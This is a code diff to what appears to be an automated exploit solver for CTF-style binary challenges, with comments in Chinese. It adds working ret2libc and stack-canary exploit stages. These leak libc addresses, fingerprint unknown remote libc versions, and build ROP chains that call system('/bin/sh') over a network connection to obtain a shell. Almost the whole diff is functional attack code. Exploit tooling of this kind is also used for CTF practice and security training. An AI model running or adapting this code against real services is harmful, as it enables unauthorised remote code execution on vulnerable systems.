@@ -278,6 +278,53 @@ def _try_pie_partial(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = No
             pass
 
 
+def _stage2_remote_cands(ch: Challenge, f: Facts, plan: S.Plan, p, out: bytes,
+                         off: int, sink: str, leak_name: str, post_cmds: list = None):
+    """远程无 libc 的 stage2：按识别出的候选逐个发。
+
+    每个候选 = {id, system, binsh, _base}；本地（_find_libc_base 命中）不走这里。
+    ret2libc 的 payload 是裸 A 填充——有 canary 的题会 smash，交给 canary_echo
+    （它有真 canary），这里失败属预期。
+    """
+    import time as _t
+    from .run import verify_shell
+
+    cands = _resolve_remote_libc(ch, f, out, leak_name, p)
+    if not cands:
+        return False, "leak failed", out, []
+    word = ch.wordsize
+    pad_len = off
+    for cand in cands:
+        base = cand["_base"]
+        system = base + cand["system"]
+        binsh = base + cand["binsh"]
+        detail = (f"remote-libc[{cand['id']}] base={hex(base)} "
+                  f"system={hex(system)} binsh={hex(binsh)}")
+        if ch.elf.bits == 64:
+            pop_rdi = f.gadgets.get("pop_rdi")
+            if not pop_rdi:
+                return False, "no pop rdi", out, []
+            chains = [ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system)]
+            if f.gadgets.get("ret"):
+                chains.insert(0, ch.p64(f.gadgets["ret"]) + ch.p64(pop_rdi)
+                              + ch.p64(binsh) + ch.p64(system))
+        else:
+            chains = [ch.p32(system) + ch.p32(0) + ch.p32(binsh)]
+        for chain in chains:
+            stage2 = b"A" * pad_len + chain + (b"\n" if sink in S.TERM_SINKS else b"")
+            try:
+                p.send(stage2)
+            except Exception:
+                return False, detail + " (send failed)", out, []
+            _t.sleep(0.2)
+            out += p.recvrepeat(0.15)
+            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
+            out += r.output
+            if r.ok:
+                return True, detail, out, r.cmds
+    return False, "stage2 failed (all remote-libc candidates)", out, []
+
+
 def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
     """同一进程内两阶段：泄漏 libc -> 回 main -> system('/bin/sh')。
 
@@ -309,9 +356,23 @@ def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None)
             return False, str(exc), exc.partial
         out = it.buf
 
+        # 带循环退出闸的程序（repeater：scanf(%d) 决定是否继续）在 ROP 前还卡在
+        # scanf —— 喂一个非 0 数字触发退出，ROP 才会执行。
+        # 【只对远程双泄 plan 发】（desc 带 '+printf'）：ch13 这类「fgets 循环等第二段
+        # 输入」的题没有闸，多喂一行会把 stage2 顶掉一位（实测回归）。
+        if "+printf" in plan.desc:
+            try:
+                p.send(b"9\n")
+                _t.sleep(0.3)
+                out += p.recvrepeat(0.3)
+            except Exception:
+                pass
+
         base = _find_libc_base(out, libc, leak_name)
         if base is None:
-            return False, "leak failed", out
+            # 远程 + 没给 libc 文件：low12 指纹识别，逐候选尝试 stage2（v7.0.4）
+            return _stage2_remote_cands(ch, f, plan, p, out, off, sink,
+                                        leak_name, post_cmds)
 
         system = base + libc.sym["system"]
         try:
@@ -547,32 +608,57 @@ def _try_canary_echo(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = No
             _t.sleep(0.4)
             out += p.recvrepeat(0.5)
             base = _find_libc_base(out, libc, "puts")
+            remote_cands = []
             if base is None:
-                p.close()
-                continue
-            system = base + libc.sym["system"]
-            try:
-                binsh = base + next(libc.search(b"/bin/sh"))
-            except StopIteration:
-                return False, "no /bin/sh in libc", out
-
-            # ---- 阶段 3：回到 main（banner 重新出现）后再溢出一次拿 shell
+                # 远程无 libc：low12 指纹识别，逐候选尝试（v7.0.4）
+                remote_cands = _resolve_remote_libc(ch, f, out, "puts", p)
+                if not remote_cands:
+                    p.close()
+                    continue
+            elif _REMOTE_LIBC_STATE.get("cand"):
+                remote_cands = [dict(_REMOTE_LIBC_STATE["cand"], _base=base)]
+            if base is not None and not remote_cands:
+                system = base + libc.sym["system"]
+                try:
+                    binsh = base + next(libc.search(b"/bin/sh"))
+                except StopIteration:
+                    return False, "no /bin/sh in libc", out            # 对候选发 stage2。单符号识别可能有多个候选（页对齐区分不了）：
+            # 一个候选打错地址进程就死 → 本连接只能试一个。用 attempt 轮换起点，
+            # 外层 for attempt 会换新连接 + 新 canary，正好一连接试一候选。
+            start = _REMOTE_LIBC_STATE.get("cand_idx", 0)
+            if remote_cands:
+                cand = remote_cands[start % len(remote_cands)]
+                _REMOTE_LIBC_STATE["cand_idx"] = start + 1
+                tag = f" remote-libc[{cand['id']}]"
+            else:
+                cand = {"_base": base, "id": "local", "system": 0, "binsh": 0}
+                cand["system"] = base + libc.sym["system"] - base
+                cand["binsh"] = base + next(libc.search(b"/bin/sh")) - base
+                tag = ""
+            base_c = cand["_base"]
             stage2 = (b"A" * canary_pos + canary + ch.p64(fake_rbp)
                       + ((ch.p64(ret_g) if ret_g else b""))
-                      + ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system))
+                      + ch.p64(pop_rdi) + ch.p64(base_c + cand["binsh"])
+                      + ch.p64(base_c + cand["system"]))
             if sink in S.TERM_SINKS:
                 stage2 += b"\n"
             try:
                 p.send(stage2)
             except Exception:
-                break
+                continue
             _t.sleep(0.3)
-            p.send(b"9\n")
+            try:
+                p.send(b"9\n")
+            except Exception:
+                continue              # 这个候选打崩了进程：换连接试下一个
             _t.sleep(0.5)
             r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
             out += r.output
             if r.ok:
-                return True, f"canary={hex(int.from_bytes(canary, 'little'))} base={hex(base)}", out, r.cmds
+                return True, (f"canary={hex(int.from_bytes(canary, 'little'))} "
+                              f"base={hex(base_c)}{tag}"), out, r.cmds
+            continue
+
         finally:
             try:
                 p.close()
@@ -601,6 +687,60 @@ def _bss_or_fallback(ch: Challenge) -> int:
         return ch.elf.bss() + 0x200
     except Exception:
         return 0x602000
+
+
+_REMOTE_LIBC_STATE: dict = {}
+
+
+def _parse_leaks(out: bytes, leak_name: str) -> Optional[dict]:
+    """从 stage1 输出解析 1~2 个泄漏值（puts 双泄时第二行是 printf@got）。
+
+    解析锚点：leak 输出紧跟在换行后（puts 行），按 6 字节小端回读。
+    """
+    import struct
+    vals: list[int] = []
+    for line in out.split(b"\n"):
+        if not (4 <= len(line) <= 8):
+            continue
+        # puts 打印的指针以 \0 截断；6 字节是 amd64 常见长度
+        for ln in (6, 5):
+            if len(line) >= ln:
+                v = int.from_bytes(line[:ln].ljust(8, b"\x00"), "little")
+                if 0x7F0000000000 <= v < 0x800000000000 and v % 0x1000 != 0:
+                    vals.append(v)
+                    break
+    if not vals:
+        return None
+    # 去重保序
+    uniq = list(dict.fromkeys(vals))
+    if len(uniq) == 1:
+        return {leak_name: uniq[0]}
+    return {leak_name: uniq[0], "printf": uniq[1]}
+
+
+def _resolve_remote_libc(ch: Challenge, f: Facts, out: bytes,
+                         leak_name: str, p) -> list[dict]:
+    """远程无 libc 时：把 stage1 的泄漏交给 libcsearch，返回逐候选尝试列表。
+
+    每个候选 = {id, system, binsh, puts, ...}；base 已按各候选 puts 偏移
+    校验页对齐。空列表 = 识别失败（如实 FAILED，不放宽判据）。
+    """
+    from . import libcsearch as LC
+    vals = _parse_leaks(out, leak_name)
+    if not vals:
+        return []
+    leak = vals[leak_name]
+    out_cands = []
+    for cand in LC.candidates(vals):
+        base = LC.rebase(leak, cand, leak_name)
+        if base is not None:
+            c = dict(cand)
+            c["_base"] = base
+            out_cands.append(c)
+    if out_cands:
+        ch.notes.append(f"remote libc candidates: "
+                        + ", ".join(c["id"] for c in out_cands))
+    return out_cands
 
 
 def _find_libc_base(out: bytes, libc, name: str) -> Optional[int]:
